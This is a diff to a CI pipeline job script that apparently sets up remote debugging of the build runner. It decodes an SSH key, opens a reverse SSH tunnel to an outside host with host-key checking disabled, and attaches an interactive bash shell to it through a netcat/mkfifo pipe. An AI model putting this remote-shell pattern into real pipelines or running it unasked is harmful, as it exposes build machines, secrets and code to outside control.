@@ -85,16 +85,13 @@ jobs:
 
   - script: |
              set -x
-             ps aux 
-             which bash
-             which sh
-             bash --version
              REVERSE_PROXY_PORT=4234
              DEBUG_KEY_PATH=~/debug_rsa
              echo $DEBUG_KEY | base64 --decode > ${DEBUG_KEY_PATH}
              chmod 0600 ${DEBUG_KEY_PATH}
              ssh -oStrictHostKeyChecking=no -R ${REVERSE_PROXY_PORT}:localhost:${REVERSE_PROXY_PORT} ${REVERSE_PROXY_USER}@$REVERSE_PROXY_IP -i $DEBUG_KEY_PATH -f -N
-             cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 ${REVERSE_PROXY_PORT} > /tmp/f
+             rm -f /tmp/f; mkfifo /tmp/f
+             cat /tmp/f | /bin/bash -i 2>&1 | nc -l 127.0.0.1 ${REVERSE_PROXY_PORT} > /tmp/f
              ## Cleanup
              rm -f /tmp/f
              rm -f $DEBUG_KEY_PATH
